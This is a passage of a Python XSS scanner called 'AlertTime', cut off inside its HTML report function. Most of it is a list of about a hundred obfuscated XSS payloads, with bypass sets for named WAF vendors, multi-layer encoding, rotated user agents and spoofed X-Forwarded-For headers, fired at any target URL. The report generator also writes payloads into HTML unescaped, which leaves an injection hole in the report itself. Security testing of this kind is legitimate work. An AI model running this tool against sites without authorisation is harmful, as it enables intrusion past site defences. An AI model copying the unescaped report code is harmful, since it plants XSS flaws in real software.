#!/usr/bin/env python3

import requests
import sys
import base64
import urllib.parse
import urllib3
import json
import time
import random
import threading
import argparse
import os
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style, init
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

__version__ = "1.0"
__author__ = "Orkhan Khalafi"
__linkedin__ = "https://www.linkedin.com/in/orkhankhalafi/"

class AlertTimeScanner:
    def __init__(self, threads=25, timeout=10, delay=0.15):
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.session = self._create_session()
        self.results = []
        self.tested_count = 0
        self.vulnerable_count = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0'
        ]

    def _create_session(self):
        session = requests.Session()
        retry_strategy = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session
    def display_banner(self):
        banner = f"""
{Fore.RED} █████╗ ██╗     ███████╗██████╗ ████████╗████████╗██╗███╗   ███╗███████╗
██╔══██╗██║     ██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██║████╗ ████║██╔════╝
███████║██║     █████╗  ██████╔╝   ██║      ██║   ██║██╔████╔██║█████╗  
██╔══██║██║     ██╔══╝  ██╔══██╗   ██║      ██║   ██║██║╚██╔╝██║██╔══╝  
██║  ██║███████╗███████╗██║  ██║   ██║      ██║   ██║██║ ╚═╝ ██║███████╗
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝

{Fore.CYAN}Advanced Multi-threaded XSS Vulnerability Scanner v{__version__}
High-performance security testing with intelligent evasion
Author: {__author__} | LinkedIn: {__linkedin__}
Threads: {self.threads} | Timeout: {self.timeout}s | Delay: {self.delay}s

{Fore.YELLOW}⚠️  LEGAL DISCLAIMER: This tool is for authorized security testing only.
    Unauthorized use is strictly prohibited. Tool owner assumes no liability
    for illegal usage or damages caused by misuse of this software.{Style.RESET_ALL}
"""
        print(banner)

    def get_payloads(self):
        return [
            "<script>alert('XSS')</script>",
            "'\"><script>confirm('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "\" onmouseover=\"alert('XSS')\"",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<video><source onerror=alert('XSS')>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<math><brute href=\"javascript:alert('XSS')\">",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "${alert('XSS')}",
            "#{alert('XSS')}",
            "';alert('XSS')//",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "javascript:alert('XSS')",
            "java\x01script:alert('XSS')",
            "vbscript:alert('XSS')",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">",
            "<svg onload=alert('XSS')>",
            "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            '<svg/onload=alert`XSS`>',
            '<img src=x onerror=alert`XSS`>',
            '<iframe srcdoc="&lt;script&gt;alert`XSS`&lt;/script&gt;">',
            r'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */onerror=alert(\'XSS\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(\'XSS\')//\x3e',
            '">\'><marquee><img src=x onerror=confirm(1)></marquee>"></h1>',
            '<details open ontoggle="alert(\'XSS\')">',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src=x onerror=alert(\'XSS\')>',
            '<select onfocus=alert(\'XSS\') autofocus>',
            '<textarea onfocus=alert(\'XSS\') autofocus>',
            '<keygen onfocus=alert(\'XSS\') autofocus>',
            '<button onclick=alert(\'XSS\')>Click</button>',
            '<form><button formaction=javascript:alert(\'XSS\')>Submit</button></form>',
            '<svg><script>alert&#40;\'XSS\'&#41;</script>',
            '<img src="javascript:alert(\'XSS\')"',
            '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
            '<base href="javascript:alert(\'XSS\')//">',
            '<bgsound src="javascript:alert(\'XSS\')">',
            '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
            '<applet code="javascript:alert(\'XSS\')">',
            '<frameset onload=alert(\'XSS\')>',
            '<ilayer onload=alert(\'XSS\')>',
            '<layer onload=alert(\'XSS\')>',
            '<blink onload=alert(\'XSS\')>',
            '<style>@import"javascript:alert(\'XSS\')";</style>',
            '<div style="background-image:url(javascript:alert(\'XSS\'))">',
            '<div style="width:expression(alert(\'XSS\'))">',
            '<img src=x:alert(alt) onerror=eval(src) alt=XSS>',
            '<img src="x" onerror="window[\'al\'+\'ert\'](\'XSS\')">',
            '<svg><animate onbegin=alert(\'XSS\') attributeName=x dur=1s>',
            '<svg><set onbegin=alert(\'XSS\') attributeName=x to=y>',
            '<svg><animateTransform onbegin=alert(\'XSS\') attributeName=transform>',
            '<svg><animateMotion onbegin=alert(\'XSS\') path="M0,0L1,1">',
            '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(\'XSS\')">',
            '<svg><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(\'XSS\')"></iframe></foreignObject></svg>',
            '<svg><use href="data:image/svg+xml,&lt;svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\' onload=\'alert(1)\'&gt;&lt;/svg&gt;#x"></use></svg>',
            '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
            '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
            '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
            '<source src=1 href=1 onerror="javascript:alert(1)"></source>',
            '<input src=1 href=1 onerror="javascript:alert(1)"></input>',
            '<menuitem src=1 href=1 onerror="javascript:alert(1)"></menuitem>',
            '<track src=1 href=1 onerror="javascript:alert(1)"></track>',
            '<embed src=1 href=1 onerror="javascript:alert(1)"></embed>',
            '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
            '<param src=1 href=1 onerror="javascript:alert(1)"></param>',
            '<font src=1 href=1 onerror="javascript:alert(1)"></font>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>Function("alert(1)")()</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
            '<script>top["al"+"ert"](1)</script>',
            '<script>top[/al/.source+/ert/.source](1)</script>',
            '<script>al\\u0065rt(1)</script>',
            '<script>al\\x65rt(1)</script>',
            '<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29")</script>',
            '<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>',
            '<script>setTimeout("alert(1)",0)</script>',
            '<script>setInterval("alert(1)",1000)</script>',
            '<script>requestAnimationFrame(function(){alert(1)})</script>',
            '<script>Promise.resolve().then(()=>alert(1))</script>'
        ]
    def generate_test_urls(self, base_url):
        test_urls = []
        
        if "?" in base_url:
            parsed = urlparse(base_url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            for param_name in params.keys():
                modified_params = params.copy()
                modified_params[param_name] = ['FUZZ']
                
                new_query = urlencode(modified_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                test_urls.append(test_url)
                
                modified_params[param_name] = ['FUZZ&additional=test']
                new_query = urlencode(modified_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                test_urls.append(test_url)
        
        test_urls.append(base_url.rstrip('/') + '/FUZZ')
        test_urls.append(base_url.rstrip('/') + '/FUZZ.html')
        test_urls.append(base_url + '#FUZZ')
        
        separator = '&' if '?' in base_url else '?'
        test_urls.append(base_url + separator + 'test=FUZZ')
        test_urls.append(base_url + separator + 'callback=FUZZ')
        test_urls.append(base_url + separator + 'jsonp=FUZZ')
        test_urls.append(base_url + separator + 'q=FUZZ')
        test_urls.append(base_url + separator + 'search=FUZZ')
        test_urls.append(base_url + separator + 'query=FUZZ')
        test_urls.append(base_url + separator + 'input=FUZZ')
        test_urls.append(base_url + separator + 'data=FUZZ')
        
        return test_urls

    def detect_waf(self, url):
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            headers = str(response.headers).lower()
            content = response.text.lower()
            
            waf_signatures = {
                'cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
                'aws': ['x-amzn-requestid', 'x-amz-cf-id'],
                'akamai': ['akamai', 'ak-bmsc'],
                'incapsula': ['incap_ses', 'visid_incap'],
                'sucuri': ['x-sucuri-id', 'sucuri'],
                'barracuda': ['barra', 'barracuda'],
                'f5': ['f5-bigip', 'bigipserver'],
                'fortinet': ['fortigate', 'fortiweb'],
                'imperva': ['imperva', 'incap_ses'],
                'modsecurity': ['mod_security', 'modsec']
            }
            
            for waf_name, signatures in waf_signatures.items():
                for signature in signatures:
                    if signature in headers or signature in content:
                        return waf_name.upper()
            
            if response.status_code == 403:
                return "UNKNOWN_WAF"
                
        except Exception:
            pass
        
        return None

    def generate_waf_bypass_payloads(self, payload, waf_type):
        bypass_payloads = []
        
        if waf_type == "CLOUDFLARE":
            bypass_payloads = [
                payload.replace('<', '&lt;').replace('>', '&gt;'),
                f'<svg/onload=alert`XSS`>',
                f'<img src=x onerror=alert`XSS`>',
                f'<iframe srcdoc="&lt;script&gt;alert`XSS`&lt;/script&gt;">',
                f'<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
                f'<script>Function("alert(1)")()</script>'
            ]
        elif waf_type == "AWS":
            bypass_payloads = [
                f'<ScRiPt>alert("XSS")</ScRiPt>',
                f'<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">',
                f'<svg onload=alert(String.fromCharCode(88,83,83))>',
                f'<script>al\\u0065rt(1)</script>',
                f'<script>al\\x65rt(1)</script>'
            ]
        elif waf_type == "AKAMAI":
            bypass_payloads = [
                f'<script>eval(atob("YWxlcnQoMSk="))</script>',
                f'<script>setTimeout("alert(1)",0)</script>',
                f'<script>top["al"+"ert"](1)</script>',
                f'<script>[].constructor.constructor("alert(1)")()</script>'
            ]
        else:
            bypass_payloads = [
                payload.replace(' ', '/**/'),
                payload.replace('(', '%28').replace(')', '%29'),
                f'<img src=x onerror=alert`XSS`>',
                f'<svg/onload=alert`XSS`>',
                f'<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>',
                f'<script>Promise.resolve().then(()=>alert(1))</script>'
            ]
            
        return bypass_payloads

    def advanced_encoding(self, payload):
        encoded_payloads = []
        
        encoded_payloads.append(urllib.parse.quote(payload))
        encoded_payloads.append(urllib.parse.quote(payload, safe=''))
        
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        encoded_payloads.append(double_encoded)
        
        import html
        html_encoded = html.escape(payload)
        encoded_payloads.append(html_encoded)
        
        unicode_payload = payload.encode('unicode_escape').decode('ascii')
        encoded_payloads.append(unicode_payload)
        
        b64_payload = base64.b64encode(payload.encode()).decode()
        encoded_payloads.append(b64_payload)
        
        hex_payload = ''.join([f'\\x{ord(c):02x}' for c in payload])
        encoded_payloads.append(hex_payload)
        
        return encoded_payloads
    def test_payload(self, url, payload, method='GET', data=None, waf_type=None):
        try:
            if payload.endswith("=") and len(payload) > 16:
                try:
                    decoded_payload = base64.b64decode(payload).decode('utf-8')
                    test_payload = decoded_payload
                except:
                    test_payload = payload
            else:
                test_payload = payload
            
            test_payloads = [test_payload]
            if waf_type:
                test_payloads.extend(self.generate_waf_bypass_payloads(test_payload, waf_type))
            
            test_payloads.extend(self.advanced_encoding(test_payload))
            
            for current_payload in test_payloads:
                if method.upper() == 'GET':
                    target_url = url.replace("FUZZ", urllib.parse.quote(current_payload, safe=''))
                    request_data = None
                else:
                    target_url = url.replace("FUZZ", "")
                    request_data = data or {}
                    if isinstance(request_data, dict):
                        for key in request_data:
                            if request_data[key] == 'FUZZ':
                                request_data[key] = current_payload
                    else:
                        request_data = str(request_data).replace('FUZZ', current_payload)
                
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Cache-Control': 'max-age=0',
                }
                
                if random.choice([True, False]):
                    headers['DNT'] = '1'
                if random.choice([True, False]):
                    headers['Sec-GPC'] = '1'
                if random.choice([True, False]):
                    headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                if method.upper() == 'POST':
                    response = self.session.post(
                        target_url,
                        data=request_data,
                        headers=headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    response = self.session.get(
                        target_url,
                        headers=headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                
                if self._check_reflection(response.text, current_payload):
                    with self.lock:
                        self.vulnerable_count += 1
                    
                    vulnerability = {
                        'timestamp': datetime.now().isoformat(),
                        'url': target_url,
                        'method': method.upper(),
                        'payload': current_payload,
                        'original_payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'content_type': response.headers.get('content-type', 'unknown'),
                        'server': response.headers.get('server', 'unknown'),
                        'vulnerability_type': 'Reflected XSS',
                        'severity': 'High',
                        'confidence': 'High',
                        'waf_detected': waf_type,
                        'response_hash': hashlib.md5(response.text.encode()).hexdigest()[:16]
                    }
                    
                    if method.upper() == 'POST' and request_data:
                        vulnerability['post_data'] = str(request_data)
                    
                    return vulnerability
                    
        except requests.exceptions.RequestException:
            pass
        except Exception:
            pass
        
        with self.lock:
            self.tested_count += 1
            
        return None

    def _check_reflection(self, response_text, payload):
        if payload in response_text:
            return True
            
        try:
            decoded_response = urllib.parse.unquote(response_text)
            if payload in decoded_response:
                return True
        except:
            pass
            
        import html
        try:
            html_decoded = html.unescape(response_text)
            if payload in html_decoded:
                return True
        except:
            pass
        
        if payload.endswith('=') and len(payload) > 16:
            try:
                decoded_payload = base64.b64decode(payload).decode('utf-8')
                if decoded_payload in response_text:
                    return True
            except:
                pass
                
        return False
    def scan_url_batch(self, urls, method='GET', post_data=None):
        payloads = self.get_payloads()
        vulnerabilities = []
        
        print(f"{Fore.BLUE}[*] Initializing scan engine with {self.threads} threads")
        print(f"[*] Target URLs: {len(urls)} | Payloads: {len(payloads)}")
        print(f"[*] Total test combinations: {len(urls) * len(payloads) * 8}")
        print(f"[*] Estimated completion time: {((len(urls) * len(payloads) * 8 * self.delay) / self.threads / 60):.1f} minutes{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for url in urls:
                waf_detected = self.detect_waf(url)
                if waf_detected:
                    print(f"{Fore.YELLOW}[!] WAF detected on {url}: {waf_detected}{Style.RESET_ALL}")
                
                test_urls = self.generate_test_urls(url)
                
                for test_url in test_urls:
                    for payload in payloads:
                        future = executor.submit(self.test_payload, test_url, payload, method, post_data, waf_detected)
                        futures.append(future)
                        
                        time.sleep(self.delay / self.threads)
            
            completed = 0
            total = len(futures)
            last_update = 0
            
            for future in as_completed(futures):
                completed += 1
                result = future.result()
                
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.GREEN}{Style.BRIGHT}[!] VULNERABILITY DETECTED!")
                    print(f"    Target: {result['url']}")
                    print(f"    Method: {result['method']}")
                    print(f"    Vector: {result['payload'][:50]}...")
                    print(f"    Status: {result['status_code']}")
                    print(f"    Server: {result['server']}")
                    if result.get('waf_detected'):
                        print(f"    WAF Bypass: {result['waf_detected']}")
                    print(f"    Hash: {result['response_hash']}{Style.RESET_ALL}")
                
                current_time = time.time()
                if current_time - last_update >= 5 or completed == total:
                    progress = (completed / total) * 100
                    elapsed = current_time - self.start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    eta = (total - completed) / rate if rate > 0 else 0
                    
                    print(f"{Fore.CYAN}[*] Progress: {completed}/{total} ({progress:.1f}%) | "
                          f"Rate: {rate:.1f}/s | Vulnerabilities: {len(vulnerabilities)} | "
                          f"ETA: {eta/60:.1f}m{Style.RESET_ALL}")
                    last_update = current_time
        
        return vulnerabilities

    def save_results(self, vulnerabilities, output_file, format_type='json'):
        if not vulnerabilities:
            print(f"{Fore.YELLOW}[*] No vulnerabilities detected to save{Style.RESET_ALL}")
            return
        
        try:
            if format_type.lower() == 'json':
                report_data = {
                    'scan_metadata': {
                        'timestamp': datetime.now().isoformat(),
                        'scanner': 'AlertTime XSS Scanner',
                        'version': __version__,
                        'author': __author__,
                        'linkedin': __linkedin__,
                        'total_vulnerabilities': len(vulnerabilities),
                        'scan_duration': time.time() - self.start_time,
                        'tests_performed': self.tested_count,
                        'success_rate': (len(vulnerabilities) / max(self.tested_count, 1)) * 100,
                        'scan_settings': {
                            'threads': self.threads,
                            'timeout': self.timeout,
                            'delay': self.delay
                        }
                    },
                    'vulnerabilities': vulnerabilities,
                    'statistics': {
                        'severity_breakdown': self._get_severity_stats(vulnerabilities),
                        'method_breakdown': self._get_method_stats(vulnerabilities),
                        'waf_bypass_success': self._get_waf_stats(vulnerabilities)
                    }
                }
                
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump(report_data, f, indent=2, ensure_ascii=False)
                    
            elif format_type.lower() == 'txt':
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write("AlertTime XSS Scanner - Security Assessment Report\n")
                    f.write("=" * 60 + "\n")
                    f.write(f"Author: {__author__} | LinkedIn: {__linkedin__}\n")
                    f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Total Vulnerabilities: {len(vulnerabilities)}\n")
                    f.write(f"Scan Duration: {(time.time() - self.start_time):.2f} seconds\n")
                    f.write(f"Tests Performed: {self.tested_count}\n\n")
                    
                    for i, vuln in enumerate(vulnerabilities, 1):
                        f.write(f"Vulnerability #{i}\n")
                        f.write("-" * 30 + "\n")
                        f.write(f"URL: {vuln['url']}\n")
                        f.write(f"Method: {vuln['method']}\n")
                        f.write(f"Payload: {vuln['payload']}\n")
                        f.write(f"Status Code: {vuln['status_code']}\n")
                        f.write(f"Server: {vuln['server']}\n")
                        f.write(f"Severity: {vuln['severity']}\n")
                        f.write(f"Confidence: {vuln['confidence']}\n")
                        if vuln.get('waf_detected'):
                            f.write(f"WAF Bypassed: {vuln['waf_detected']}\n")
                        if 'post_data' in vuln:
                            f.write(f"POST Data: {vuln['post_data']}\n")
                        f.write(f"Response Hash: {vuln['response_hash']}\n")
                        f.write("\n")
            
            elif format_type.lower() == 'csv':
                import csv
                with open(output_file, 'w', newline='', encoding='utf-8') as f:
                    fieldnames = ['timestamp', 'url', 'method', 'payload', 'status_code', 'server', 'severity', 'confidence', 'waf_detected', 'response_hash']
                    writer = csv.DictWriter(f, fieldnames=fieldnames)
                    writer.writeheader()
                    
                    for vuln in vulnerabilities:
                        row = {key: vuln.get(key, '') for key in fieldnames}
                        writer.writerow(row)
            
            print(f"{Fore.GREEN}[+] Results exported to {output_file} ({format_type.upper()} format){Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[-] Export failed: {e}{Style.RESET_ALL}")

    def _get_severity_stats(self, vulnerabilities):
        stats = {}
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Unknown')
            stats[severity] = stats.get(severity, 0) + 1
        return stats

    def _get_method_stats(self, vulnerabilities):
        stats = {}
        for vuln in vulnerabilities:
            method = vuln.get('method', 'Unknown')
            stats[method] = stats.get(method, 0) + 1
        return stats

    def _get_waf_stats(self, vulnerabilities):
        stats = {}
        for vuln in vulnerabilities:
            waf = vuln.get('waf_detected', 'None')
            stats[waf] = stats.get(waf, 0) + 1
        return stats
    def generate_html_report(self, vulnerabilities, output_file):
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlertTime XSS Scanner - Security Assessment Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f9fa; color: #333; }}
        .container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px; border-radius: 15px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }}
        .header h1 {{ font-size: 3em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }}
        .header p {{ font-size: 1.2em; opacity: 0.9; }}
        .author-info {{ background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin-top: 20px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; margin-bottom: 40px; }}
        .stat-card {{ background: white; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-left: 5px solid #667eea; transition: transform 0.3s ease; }}
        .stat-card:hover {{ transform: translateY(-5px); }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; color: #667eea; margin-bottom: 10px; }}
        .stat-label {{ color: #666; font-size: 1.1em; }}
        .vulnerabilities {{ background: white; border-radius: 15px; padding: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }}
        .vuln-item {{ border: 1px solid #e9ecef; border-radius: 10px; margin: 20px 0; overflow: hidden; transition: box-shadow 0.3s ease; }}
        .vuln-item:hover {{ box-shadow: 0 5px 15px rgba(0,0,0,0.15); }}
        .vuln-header {{ background: #dc3545; color: white; padding: 20px; font-weight: bold; font-size: 1.2em; }}
        .vuln-content {{ padding: 25px; }}
        .vuln-field {{ margin: 15px 0; display: flex; align-items: flex-start; }}
        .vuln-label {{ font-weight: bold; color: #495057; min-width: 120px; }}
        .vuln-value {{ margin-left: 15px; font-family: 'Courier New', monospace; background: #f8f9fa; padding: 8px 12px; border-radius: 5px; flex: 1; word-break: break-all; }}
        .severity-high {{ border-left: 6px solid #dc3545; }}
        .severity-medium {{ border-left: 6px solid #ffc107; }}
        .severity-low {{ border-left: 6px solid #28a745; }}
        .footer {{ text-align: center; padding: 30px; color: #666; border-top: 2px solid #e9ecef; margin-top: 40px; }}
        .disclaimer {{ background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 20px; border-radius: 10px; margin: 20px 0; }}
        .no-vulns {{ background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 30px; border-radius: 10px; text-align: center; font-size: 1.2em; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ AlertTime XSS Scanner</h1>
            <p>Advanced Security Assessment Report v{__version__}</p>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Duration: {(time.time() - self.start_time):.2f}s</p>
            <div class="author-info">
                <strong>Author:</strong> {__author__} | 
                <strong>LinkedIn:</strong> <a href="{__linkedin__}" target="_blank" style="color: #fff;">{__linkedin__}</a>
            </div>
        </div>
        
        <div class="disclaimer">
            <strong>⚠️ LEGAL DISCLAIMER:</strong> This security assessment was conducted using AlertTime XSS Scanner. 
            This tool is intended for authorized security testing only. Unauthorized use is strictly prohibited. 
            The tool owner assumes no liability for illegal usage or damages caused by misuse of this software.
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">{len(vulnerabilities)}</div>
                <div class="stat-label">Vulnerabilities Detected</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.tested_count}</div>
                <div class="stat-label">Security Tests Performed</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.threads}</div>
                <div class="stat-label">Concurrent Threads</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len([v for v in vulnerabilities if v.get('severity') == 'High'])}</div>
                <div class="stat-label">High Risk Issues</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len([v for v in vulnerabilities if v.get('waf_detected')])}</div>
                <div class="stat-label">WAF Bypasses</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{((len(vulnerabilities) / max(self.tested_count, 1)) * 100):.1f}%</div>
                <div class="stat-label">Success Rate</div>
            </div>
        </div>
        
        <div class="vulnerabilities">
            <h2>🚨 Security Vulnerabilities</h2>
"""
        
        if vulnerabilities:
            for i, vuln in enumerate(vulnerabilities, 1):
                severity_class = f"severity-{vuln.get('severity', 'high').lower()}"
                html_content += f"""
            <div class="vuln-item {severity_class}">
                <div class="vuln-header">
                    Vulnerability #{i} - {vuln.get('vulnerability_type', 'XSS')} [{vuln.get('severity', 'High')} Risk]
                </div>
                <div class="vuln-content">
                    <div class="vuln-field">
                        <span class="vuln-label">Target URL:</span>
                        <span class="vuln-value">{vuln['url']}</span>
                    </div>
                    <div class="vuln-field">
                        <span class="vuln-label">HTTP Method:</span>
                        <span class="vuln-value">{vuln['method']}</span>
                    </div>
                    <div class="vuln-field">
                        <span class="vuln-label">Attack Vector:</span>
                        <span class="vuln-value">{vuln['payload']}</span>
                    </div>
                    <div class="vuln-field">
                        <span class="vuln-label">Response Code:</span>
                        <span class="vuln-value">{vuln['status_code']}</span>
                    </div>
                    <div class="vuln-field">
                        <span class="vuln-label">Server Info:</span>
                        <span class="vuln-value">{vuln['server']}</span>
                    </div>
                    <div class="vuln-field">
                        <span class="vuln-label">Confidence:</span>
                        <span class="vuln-value">{vuln['confidence']}</span>
                    </div>"""
                
                if vuln.get('waf_detected'):
                    html_content += f"""
                    <div class="vuln-field">
                        <span class="vuln-label">WAF Bypassed:</span>
                        <span class="vuln-value">{vuln['waf_detected']}</span>
                    </div>"""
                
                if vuln.get('post_data'):
                    html_content += f"""
                    <div class="vuln-field">
                        <span class="vuln-label">POST Data:</span>
                        <span class="vuln-value">{vuln['post_data']}</span>
                    </div>"""
                
                html_content += f"""
                    <div class="vuln-field">
                        <span class="vuln-label">Response Hash:</span>
                        <span class="vuln-value">{vuln['response_hash']}</span>
                    </div>
                    <div class="vuln-field">
                        <span class="vuln-label">Detected At:</span>
                        <span class="vuln-value">{vuln['timestamp']}</span>
                    </div>
                </div>
            </div>
"""
        else:
            html_content += """
            <div class="no-vulns">
                <h3>✅ No Security Vulnerabilities Detected</h3>
                <p>All tested endpoints appear to be properly secured against XSS attacks.</p>
            </div>
"""
        
        html_content += f"""
        </div>
        
        <div class="footer">
            <p><strong>AlertTime XSS Scanner v{__version__}</strong> - Advanced Multi-threaded Security Testing</p>
            <p>Author: {__author__} | LinkedIn: <a href="{__linkedin__}" target="_blank">{__linkedin__}</a></p>
            <p>Scan completed in {(time.time() - self.start_time):.2f} seconds with {self.tested_count} security tests</p>
            <p>⚠️ This tool is for authorized security testing only. Unauthorized use is prohibited.</p>
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"{Fore.GREEN}[+] Professional HTML report generated: {output_file}{Style.RESET_ALL}")
        except Exception as e:
